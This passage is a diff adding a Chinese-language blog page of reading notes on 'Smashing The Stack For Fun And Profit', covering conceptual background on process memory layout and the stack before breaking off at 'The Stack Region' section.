@@ -1,0 +1,1412 @@
+<!doctype html><html lang=zh-cn><head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#"><meta charset=utf-8><meta name=generator content="Hugo 0.81.0"><meta name=theme-color content="#fff"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=format-detection content="telephone=no, date=no, address=no, email=no"><meta http-equiv=cache-control content="no-transform"><meta http-equiv=cache-control content="no-siteapp"><title>Reading-Note-of-Smashing-The-Stack-For-Fun | Magic's Blog</title><link rel=stylesheet href=/css/meme.min.b1f218c611af8aa4204ad1285f7c33d736b17a9b8436ab5bde0a7f57aa28bb1d.css><script src=https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js defer></script><script src=/js/meme.min.009a0b83c250beab5ead6d2b3ab4b4ba3d2e15b162ce06c18a8c42b69a2e934b.js></script><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=stylesheet href="https://fonts.googleapis.com/css2?family=EB+Garamond:ital,wght@0,400;0,500;0,700;1,400;1,700&family=Noto+Serif+SC:wght@400;500;700&family=Source+Code+Pro:ital,wght@0,400;0,700;1,400;1,700&display=swap" media=print onload="this.media='all'"><noscript><link rel=stylesheet href="https://fonts.googleapis.com/css2?family=EB+Garamond:ital,wght@0,400;0,500;0,700;1,400;1,700&family=Noto+Serif+SC:wght@400;500;700&family=Source+Code+Pro:ital,wght@0,400;0,700;1,400;1,700&display=swap"></noscript><meta name=author content="Magic"><meta name=description content="论文阅读笔记：Smashing The Stack For Fun And Profit 原文：Smashing The Stack For Fun And Profit 序 在C编……"><link rel="shortcut icon" href=/favicon.ico type=image/x-icon><link rel=mask-icon href=/icons/safari-pinned-tab.svg color=#2a6df4><link rel=apple-touch-icon sizes=180x180 href=/icons/apple-touch-icon.png><meta name=apple-mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-title content="Magic's Blog"><meta name=apple-mobile-web-app-status-bar-style content="black"><meta name=mobile-web-app-capable content="yes"><meta name=application-name content="Magic's Blog"><meta name=msapplication-starturl content="../../"><meta name=msapplication-TileColor content="#fff"><meta name=msapplication-TileImage content="../../icons/mstile-150x150.png"><link rel=manifest href=/manifest.json><link rel=canonical href=https://magic-king.net/posts/reading-note-of-smashing-the-stack-for-fun/><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","datePublished":"2021-02-25T16:33:12+08:00","dateModified":"2021-02-25T14:01:04+00:00","url":"https://magic-king.net/posts/reading-note-of-smashing-the-stack-for-fun/","headline":"Reading-Note-of-Smashing-The-Stack-For-Fun","description":"论文阅读笔记：Smashing The Stack For Fun And Profit 原文：Smashing The Stack For Fun And Profit 序 在C编……","inLanguage":"zh-CN","articleSection":"posts","wordCount":13036,"image":["https://magic-king.net/Fig.1_Process_Memory_Regions.png","https://magic-king.net/stack1.png","https://magic-king.net/stack2.png","https://magic-king.net/stack3.png","https://magic-king.net/stack4.png","https://magic-king.net/problem1.png","https://magic-king.net/stack5.png"],"author":{"@type":"Person","description":"Now You See Me!","email":"Ma9icKing@gmail.com","image":"https://magic-king.net/icons/favicon.ico","url":"https://magic-king.net/","name":"Magic"},"license":"[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)","publisher":{"@type":"Organization","name":"Magic's Blog","logo":{"@type":"ImageObject","url":"https://magic-king.net/icons/favicon.ico"},"url":"https://magic-king.net/"},"mainEntityOfPage":{"@type":"WebSite","@id":"https://magic-king.net/"}}</script><meta name=twitter:card content="summary_large_image"><meta property="og:title" content="Reading-Note-of-Smashing-The-Stack-For-Fun"><meta property="og:description" content="论文阅读笔记：Smashing The Stack For Fun And Profit 原文：Smashing The Stack For Fun And Profit 序 在C编……"><meta property="og:url" content="https://magic-king.net/posts/reading-note-of-smashing-the-stack-for-fun/"><meta property="og:site_name" content="Magic's Blog"><meta property="og:locale" content="zh"><meta property="og:image" content="https://magic-king.net/Fig.1_Process_Memory_Regions.png"><meta property="og:type" content="article"><meta property="article:published_time" content="2021-02-25T16:33:12+08:00"><meta property="article:modified_time" content="2021-02-25T14:01:04+00:00"><meta property="article:section" content="posts"></head><body><div class=container><header class=header><div class=header-wrapper><div class="header-inner single"><div class=site-brand><a href=/ class=brand>Magic's Blog</a></div><nav class=nav><ul class=menu id=menu><li class=menu-item><a href=/posts/><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon archive"><path d="M32 448c0 17.7 14.3 32 32 32h384c17.7.0 32-14.3 32-32V160H32v288zm160-212c0-6.6 5.4-12 12-12h104c6.6.0 12 5.4 12 12v8c0 6.6-5.4 12-12 12H204c-6.6.0-12-5.4-12-12v-8zM480 32H32C14.3 32 0 46.3.0 64v48c0 8.8 7.2 16 16 16h480c8.8.0 16-7.2 16-16V64c0-17.7-14.3-32-32-32z"/></svg><span class=menu-item-name>Archive</span></a></li><li class=menu-item><a href=/categories/><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon th"><path d="M149.333 56v80c0 13.255-10.745 24-24 24H24c-13.255.0-24-10.745-24-24V56c0-13.255 10.745-24 24-24h101.333c13.255.0 24 10.745 24 24zm181.334 240v-80c0-13.255-10.745-24-24-24H205.333c-13.255.0-24 10.745-24 24v80c0 13.255 10.745 24 24 24h101.333c13.256.0 24.001-10.745 24.001-24zm32-240v80c0 13.255 10.745 24 24 24H488c13.255.0 24-10.745 24-24V56c0-13.255-10.745-24-24-24H386.667c-13.255.0-24 10.745-24 24zm-32 80V56c0-13.255-10.745-24-24-24H205.333c-13.255.0-24 10.745-24 24v80c0 13.255 10.745 24 24 24h101.333c13.256.0 24.001-10.745 24.001-24zm-205.334 56H24c-13.255.0-24 10.745-24 24v80c0 13.255 10.745 24 24 24h101.333c13.255.0 24-10.745 24-24v-80c0-13.255-10.745-24-24-24zM0 376v80c0 13.255 10.745 24 24 24h101.333c13.255.0 24-10.745 24-24v-80c0-13.255-10.745-24-24-24H24c-13.255.0-24 10.745-24 24zm386.667-56H488c13.255.0 24-10.745 24-24v-80c0-13.255-10.745-24-24-24H386.667c-13.255.0-24 10.745-24 24v80c0 13.255 10.745 24 24 24zm0 160H488c13.255.0 24-10.745 24-24v-80c0-13.255-10.745-24-24-24H386.667c-13.255.0-24 10.745-24 24v80c0 13.255 10.745 24 24 24zM181.333 376v80c0 13.255 10.745 24 24 24h101.333c13.255.0 24-10.745 24-24v-80c0-13.255-10.745-24-24-24H205.333c-13.255.0-24 10.745-24 24z"/></svg><span class=menu-item-name>Categories</span></a></li><li class=menu-item><a href=/tags/><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512" class="icon tags"><path d="M497.941 225.941 286.059 14.059A48 48 0 00252.118.0H48C21.49.0.0 21.49.0 48v204.118a48 48 0 0014.059 33.941l211.882 211.882c18.744 18.745 49.136 18.746 67.882.0l204.118-204.118c18.745-18.745 18.745-49.137.0-67.882zM112 160c-26.51.0-48-21.49-48-48s21.49-48 48-48 48 21.49 48 48-21.49 48-48 48zm513.941 133.823L421.823 497.941c-18.745 18.745-49.137 18.745-67.882.0l-.36-.36L527.64 323.522c16.999-16.999 26.36-39.6 26.36-63.64s-9.362-46.641-26.36-63.64L331.397.0h48.721a48 48 0 0133.941 14.059l211.882 211.882c18.745 18.745 18.745 49.137.0 67.882z"/></svg><span class=menu-item-name>Tags</span></a></li><li class=menu-item><a href=/about/><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512" class="icon user-circle"><path d="M248 8C111 8 0 119 0 256s111 248 248 248 248-111 248-248S385 8 248 8zm0 96c48.6.0 88 39.4 88 88s-39.4 88-88 88-88-39.4-88-88 39.4-88 88-88zm0 344c-58.7.0-111.3-26.6-146.5-68.2 18.8-35.4 55.6-59.8 98.5-59.8 2.4.0 4.8.4 7.1 1.1 13 4.2 26.6 6.9 40.9 6.9s28-2.7 40.9-6.9c2.3-.7 4.7-1.1 7.1-1.1 42.9.0 79.7 24.4 98.5 59.8C359.3 421.4 306.7 448 248 448z"/></svg><span class=menu-item-name>About</span></a></li><li class=menu-item><a id=theme-switcher href=#><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon theme-icon-light"><path d="M193.2 104.5 242 7a18 18 0 0128 0l48.8 97.5L422.2 70A18 18 0 01442 89.8l-34.5 103.4L505 242a18 18 0 010 28l-97.5 48.8L442 422.2A18 18 0 01422.2 442l-103.4-34.5L270 505a18 18 0 01-28 0l-48.8-97.5L89.8 442A18 18 0 0170 422.2l34.5-103.4-97.5-48.8a18 18 0 010-28l97.5-48.8L70 89.8A18 18 0 0189.8 70zM256 128a128 128 0 10.01.0M256 160a96 96 0 10.01.0"/></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon theme-icon-dark"><path d="M27 412A256 256 0 10181 5a11.5 11.5.0 00-5 20A201.5 201.5.0 0142 399a11.5 11.5.0 00-15 13"/></svg></a></li><li class="menu-item search-item"><form id=search class=search role=search><label for=search-input><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon search-icon"><path d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></label><input type=search id=search-input class=search-input></form><template id=search-result hidden><article class="content post"><h2 class=post-title><a class=summary-title-link></a></h2><summary class=summary></summary><div class=read-more-container><a class=read-more-link>阅读更多 »</a></div></article></template></li></ul></nav></div></div><input type=checkbox id=nav-toggle aria-hidden=true>
+<label for=nav-toggle class=nav-toggle></label><label for=nav-toggle class=nav-curtain></label></header><main class="main single" id=main><div class=main-inner><article class="content post h-entry" data-align=justify data-type=posts data-toc-num=true><h1 class="post-title p-name">Reading-Note-of-Smashing-The-Stack-For-Fun</h1><div class=post-meta><time datetime=2021-02-25T16:33:12+08:00 class="post-meta-item published dt-published"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon post-meta-icon"><path d="M148 288h-40c-6.6.0-12-5.4-12-12v-40c0-6.6 5.4-12 12-12h40c6.6.0 12 5.4 12 12v40c0 6.6-5.4 12-12 12zm108-12v-40c0-6.6-5.4-12-12-12h-40c-6.6.0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6.0 12-5.4 12-12zm96 0v-40c0-6.6-5.4-12-12-12h-40c-6.6.0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6.0 12-5.4 12-12zm-96 96v-40c0-6.6-5.4-12-12-12h-40c-6.6.0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6.0 12-5.4 12-12zm-96 0v-40c0-6.6-5.4-12-12-12h-40c-6.6.0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6.0 12-5.4 12-12zm192 0v-40c0-6.6-5.4-12-12-12h-40c-6.6.0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6.0 12-5.4 12-12zm96-260v352c0 26.5-21.5 48-48 48H48c-26.5.0-48-21.5-48-48V112c0-26.5 21.5-48 48-48h48V12c0-6.6 5.4-12 12-12h40c6.6.0 12 5.4 12 12v52h128V12c0-6.6 5.4-12 12-12h40c6.6.0 12 5.4 12 12v52h48c26.5.0 48 21.5 48 48zm-48 346V160H48v298c0 3.3 2.7 6 6 6h340c3.3.0 6-2.7 6-6z"/></svg>&nbsp;2021.2.25</time>
+<time datetime=2021-02-25T14:01:04+00:00 class="post-meta-item modified dt-updated"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon post-meta-icon"><path d="M4e2 64h-48V12c0-6.627-5.373-12-12-12h-40c-6.627.0-12 5.373-12 12v52H160V12c0-6.627-5.373-12-12-12h-40c-6.627.0-12 5.373-12 12v52H48C21.49 64 0 85.49.0 112v352c0 26.51 21.49 48 48 48h352c26.51.0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm-6 4e2H54a6 6 0 01-6-6V160h352v298a6 6 0 01-6 6zm-52.849-200.65L198.842 404.519c-4.705 4.667-12.303 4.637-16.971-.068l-75.091-75.699c-4.667-4.705-4.637-12.303.068-16.971l22.719-22.536c4.705-4.667 12.303-4.637 16.97.069l44.104 44.461 111.072-110.181c4.705-4.667 12.303-4.637 16.971.068l22.536 22.718c4.667 4.705 4.636 12.303-.069 16.97z"/></svg>&nbsp;2021.2.25</time>
+<span class="post-meta-item category"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M464 128H272l-54.63-54.63c-6-6-14.14-9.37-22.63-9.37H48C21.49 64 0 85.49.0 112v288c0 26.51 21.49 48 48 48h416c26.51.0 48-21.49 48-48V176c0-26.51-21.49-48-48-48zm0 272H48V112h140.12l54.63 54.63c6 6 14.14 9.37 22.63 9.37H464v224z"/></svg>&nbsp;<a href=/categories/reversepwn/ class="category-link p-category">reverse，pwn</a></span>
+<span class="post-meta-item wordcount"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M497.9 142.1l-46.1 46.1c-4.7 4.7-12.3 4.7-17 0l-111-111c-4.7-4.7-4.7-12.3.0-17l46.1-46.1c18.7-18.7 49.1-18.7 67.9.0l60.1 60.1c18.8 18.7 18.8 49.1.0 67.9zM284.2 99.8 21.6 362.4.4 483.9c-2.9 16.4 11.4 30.6 27.8 27.8l121.5-21.3 262.6-262.6c4.7-4.7 4.7-12.3.0-17l-111-111c-4.8-4.7-12.4-4.7-17.1.0zM124.1 339.9c-5.5-5.5-5.5-14.3.0-19.8l154-154c5.5-5.5 14.3-5.5 19.8.0s5.5 14.3.0 19.8l-154 154c-5.5 5.5-14.3 5.5-19.8.0zM88 424h48v36.3l-64.5 11.3-31.1-31.1L51.7 376H88v48z"/></svg>&nbsp;13036</span>
+<span class="post-meta-item reading-time"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm0 448c-110.5.0-2e2-89.5-2e2-2e2S145.5 56 256 56s2e2 89.5 2e2 2e2-89.5 2e2-2e2 2e2zm61.8-104.4-84.9-61.7c-3.1-2.3-4.9-5.9-4.9-9.7V116c0-6.6 5.4-12 12-12h32c6.6.0 12 5.4 12 12v141.7l66.8 48.6c5.4 3.9 6.5 11.4 2.6 16.8L334.6 349c-3.9 5.3-11.4 6.5-16.8 2.6z"/></svg>&nbsp;27&nbsp;分钟</span>
+<span class="post-meta-item busuanzi-page-pv" id=busuanzi_container_page_pv><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512" class="icon post-meta-icon"><path d="M288 144a110.94 110.94.0 00-31.24 5 55.4 55.4.0 017.24 27 56 56 0 01-56 56 55.4 55.4.0 01-27-7.24A111.71 111.71.0 10288 144zm284.52 97.4C518.29 135.59 410.93 64 288 64S57.68 135.64 3.48 241.41a32.35 32.35.0 000 29.19C57.71 376.41 165.07 448 288 448s230.32-71.64 284.52-177.41a32.35 32.35.0 000-29.19zM288 4e2c-98.65.0-189.09-55-237.93-144C98.91 167 189.34 112 288 112s189.09 55 237.93 144C477.1 345 386.66 4e2 288 4e2z"/></svg>&nbsp;<span id=busuanzi_value_page_pv></span></span></div><div class="post-body e-content"><h2 id=论文阅读笔记smashing-the-stack-for-fun-and-profit><a href=#论文阅读笔记smashing-the-stack-for-fun-and-profit class=anchor-link><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96.0-59.27-59.26-59.27-155.7.0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757.0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037.0 01-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482.0 0120.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96.0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454.0 0020.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037.0 00-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639.0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>论文阅读笔记：Smashing The Stack For Fun And Profit</h2><blockquote><p>原文：<a href=./Smashing_The_Stack_For_Fun_And_Profit.pdf>Smashing The Stack For Fun And Profit</a></p></blockquote><h3 id=序><a href=#序 class=anchor-link><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96.0-59.27-59.26-59.27-155.7.0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757.0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037.0 01-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482.0 0120.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96.0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454.0 0020.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037.0 00-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639.0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>序</h3><p>在C编程实现中，Smashing the stack，向程序中一个被定义的数组的末尾写入一些东西可以破坏堆栈的执行结构，这是有可能的。执行这个写操作的代码(code，现在也可以叫做shellcode)可能会破坏堆栈结构，并且导致程序返回之后跳向一个随机的地址。这可能产生一些最隐蔽的依赖数据才能发现的bug。这个变量（指上文中的code）包括堆栈垃圾化（trash the stack）、堆栈乱写（scribble the stack）、堆栈被破坏（mangle the stack）；术语mung the stack并未被使用(the term mung the stack is not used，感觉怪怪的)，正如这不是被故意使用的。看看导致的后果(See spam)，别名bug、在内核中任意执行、内存泄漏、优先权丢失、overrun screw。</p><h3 id=introduction><a href=#introduction class=anchor-link><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96.0-59.27-59.26-59.27-155.7.0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757.0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037.0 01-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482.0 0120.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96.0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454.0 0020.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037.0 00-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639.0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>Introduction</h3><p>在过去的几个月中，发现和利用缓冲区溢出漏洞的人数大大增加。 比如syslog，splitvt，sendmail 8.7.5，Linux / FreeBSD挂载，Xt库等。本文试图解释缓冲区溢出是什么，以及它们的利用方式。 这需要基本的汇编知识。 虚拟内存概念的理解和使用gdb的经验对此非常有帮助，但不是必需的。 我们还假定我们正在使用Intel x86 CPU，并且操作系统是Linux。</p><p>在我们开始之前，我们需要了解一些基本定义：缓冲区只是计算机内存的一个连续块，其中包含相同数据类型的多个实例。 C程序员通常了解字缓冲区数组， 最常见的就是字符数组。 像C中的所有变量一样，数组可以声明为静态或动态。 静态变量在加载时在数据段上分配。 动态变量是在运行时在堆栈上分配的。 溢出是指超过栈顶、超出边界等等。 我们这里将只关注动态缓冲区的溢出，即基于堆栈的缓冲区溢出。</p><h3 id=process-memory-organization><a href=#process-memory-organization class=anchor-link><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96.0-59.27-59.26-59.27-155.7.0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757.0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037.0 01-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482.0 0120.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96.0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454.0 0020.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037.0 00-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639.0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>Process Memory Organization</h3><p>要了解什么是堆栈缓冲区，我们必须首先了解内存中进程的组织方式。进程被分为三个区域：文本段，数据段和堆栈。我们将集中讨论堆栈，但是首先要对其他两个进行一些概述。文本段由程序固定，包括代码（指令）和只读数据。此区域对应于可执行文件的文本部分，通常标记为“只读”，任何对该部分的写操作都将导致段错误（segment fault）。数据区域包含已初始化数据和未初始化的数据。静态变量存储在该区域中。数据 区域对应于可执行文件的.data(已初始化) 和 .bss(未初始化)部分。可以使用brk（2）system call来更改其大小。如果 .bss 中的数据进行扩展或用户堆栈耗尽了可用的内存，则该进程将被阻塞并重新分配更大的内存空间再次运行。在.data数据段和堆栈段之间添加了新的内存。</p><p><img src=Fig.1_Process_Memory_Regions.png alt></p><h3 id=what-is-a-stack><a href=#what-is-a-stack class=anchor-link><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96.0-59.27-59.26-59.27-155.7.0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757.0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037.0 01-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482.0 0120.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96.0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454.0 0020.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037.0 00-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639.0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>What Is A Stack?</h3><p>堆栈是计算机科学中经常使用的一种抽象数据类型。对象堆栈的属性是，放置在堆栈上的最后一个对象将是删除的第一个对象。这种特性通常称为先进后出队列或LIFO(Last in First out)。在堆栈上定义了几个操作，最重要的两个是<code>PUSH</code>和<code>POP</code>。PUSH在堆栈顶部添加一个元素，相反地，POP通过删除堆栈顶部的最后一个元素将堆栈大小减小了一个。</p><h3 id=why-do-we-use-a-stack><a href=#why-do-we-use-a-stack class=anchor-link><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96.0-59.27-59.26-59.27-155.7.0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757.0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037.0 01-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482.0 0120.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96.0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454.0 0020.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037.0 00-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639.0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>Why Do We Use A Stack?</h3><p>现代计算机的设计考虑了高级语言的需求。用于构造高级语言引入的程序的最重要技术是过程或函数。从一个角度来看，过程调用会像跳转一样改变控制流，但是与跳转不同，过程调用完成后，函数会将控制权返回给调用后的语句或指令。这种高级抽象是在堆栈的帮助下实现的。堆栈还用于动态分配函数中使用的局部变量，将参数传递给函数以及从函数获取返回值</p><h3 id=the-stack-region><a href=#the-stack-region class=anchor-link><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96.0-59.27-59.26-59.27-155.7.0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 